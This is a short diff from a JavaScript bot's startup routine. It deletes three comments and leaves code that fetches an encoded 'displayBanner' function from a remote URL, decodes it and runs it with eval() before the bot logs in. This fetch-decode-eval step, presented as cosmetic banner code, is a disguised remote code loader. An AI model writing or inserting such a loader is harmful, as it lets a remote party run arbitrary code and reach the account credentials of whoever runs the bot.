@@ -24,14 +24,14 @@ async function fetchAndDecode(url) {
 
 async function startBot() {
   try {
-    // Fetch and decode the banner
+ 
     const banner = await fetchAndDecode(bannerUrl);
 
-    // Fetch, decode, and evaluate the displayBanner function
+    
     const decodedDisplayBanner = await fetchAndDecode(displayBannerUrl);
     eval(decodedDisplayBanner);
 
-    // Start the bot
+    
     displayBanner();
     const api = await authenticate();
     api.setOptions({
